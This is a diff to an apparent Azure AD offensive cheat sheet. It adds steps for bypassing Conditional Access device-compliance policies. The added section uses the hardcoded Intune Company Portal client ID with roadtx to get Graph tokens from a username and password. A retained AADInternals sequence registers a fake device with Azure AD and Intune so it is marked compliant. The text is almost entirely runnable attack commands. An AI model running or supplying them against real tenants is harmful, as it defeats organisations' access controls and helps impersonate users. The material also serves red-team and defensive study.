@@ -19,17 +19,33 @@ Conditional Access is used to restrict access to resources to compliant devices 
 
 ## Bypassing CAP by faking device compliance
 
+### Intune Company Portal Client ID Bypass
+
+Use Intune Company Portal Client ID (`9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`), to run roadrecon even when there is a device compliance policy. it is a hardcoded and undocumented exclusion in Conditional Access for device compliance and has the `user_impersonation` rights on the AAD Graph.
+
+* Client ID: `9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`
+
+```ps1
+roadtx gettokens -u $username -p $password -r msgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 # limite scope
+roadtx gettokens -u $username -p $password -r aadgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 # user_impersonation scope
+```
+
+### AAD Internals - Making your device compliant
+
 ```powershell
-# AAD Internals - Making your device compliant
 # Get an access token for AAD join and save to cache
 Get-AADIntAccessTokenForAADJoin -SaveToCache
+
 # Join the device to Azure AD
 Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
+
 # Marking device compliant - option 1: Registering device to Intune
 # Get an access token for Intune MDM and save to cache (prompts for credentials)
 Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
+
 # Join the device to Intune
 Join-AADIntDeviceToIntune -DeviceName "SixByFour"
+
 # Start the call back
 Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
 ```
